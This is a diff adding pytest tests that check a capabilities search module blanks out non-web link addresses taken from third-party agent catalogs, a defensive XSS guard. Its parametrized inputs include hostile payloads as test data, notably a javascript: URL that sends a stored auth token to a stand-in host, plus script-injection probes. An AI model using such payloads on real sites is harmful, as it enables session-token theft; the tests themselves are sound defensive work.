@@ -434,3 +434,75 @@ def test_an_unreachable_agent_contributes_nothing_to_the_vocabulary(monkeypatch)
 
     monkeypatch.setattr(capabilities, "facts_for", unreachable)
     assert capabilities.vocabulary(orgs={"x": "https://x.test"}) == {}
+
+
+# ── addresses the page will turn into links ─────────────────────────────────
+#
+# The page renders ``url`` and ``facts_url`` as links on nandaindex.org, and
+# both come from a third party's documents. A ``javascript:`` address there is
+# a script running on the index's own origin when a reader clicks it, so only
+# web addresses are passed through.
+
+
+@pytest.mark.parametrize(
+    "address",
+    [
+        "javascript:fetch('//x/?'+localStorage.nanda_auth_token)",
+        "JavaScript:alert(1)",
+        "data:text/html,<script>alert(1)</script>",
+        "vbscript:msgbox(1)",
+        "//evil.test/card.json",
+        "https:no-host",
+        "card.json",
+    ],
+)
+def test_a_catalog_address_that_is_not_a_web_url_is_not_passed_on(monkeypatch, address):
+    monkeypatch.setattr(
+        capabilities,
+        "org_catalog",
+        lambda url, *, timeout=20.0: _catalog("x", _entry("someone", ["leadership"], url=address)),
+    )
+
+    def unreachable(card_url, *, timeout=20.0):
+        raise capabilities.AgentFactsError("not https")
+
+    monkeypatch.setattr(capabilities, "facts_for", unreachable)
+    match = capabilities.search("leadership", orgs={"x": "https://x.test"}).matches[0]
+
+    assert match.url == ""
+    assert match.facts_url == ""
+    assert match.to_dict()["url"] == ""
+
+
+def test_an_agentfacts_address_that_is_not_a_web_url_is_not_passed_on(monkeypatch):
+    monkeypatch.setattr(
+        capabilities,
+        "org_catalog",
+        lambda url, *, timeout=20.0: _catalog("x", _entry("someone", ["leadership"])),
+    )
+    from concierge.agentfacts import Facts
+
+    monkeypatch.setattr(
+        capabilities,
+        "facts_for",
+        lambda card_url, *, timeout=20.0: Facts(url="javascript:alert(1)", skills=("leadership",)),
+    )
+    match = capabilities.search("leadership", orgs={"x": "https://x.test"}).matches[0]
+
+    assert match.facts_url == ""
+    assert match.url == "https://someone.test/card.json", "the catalog's own web address is kept"
+
+
+@pytest.mark.parametrize("address", ["https://a.test/card.json", "http://a.test:8080/x?y=1"])
+def test_a_web_address_is_passed_on_unchanged(monkeypatch, address):
+    monkeypatch.setattr(
+        capabilities,
+        "org_catalog",
+        lambda url, *, timeout=20.0: _catalog("x", _entry("someone", ["leadership"], url=address)),
+    )
+
+    def unreachable(card_url, *, timeout=20.0):
+        raise capabilities.AgentFactsError("down")
+
+    monkeypatch.setattr(capabilities, "facts_for", unreachable)
+    assert capabilities.search("leadership", orgs={"x": "https://x.test"}).matches[0].url == address
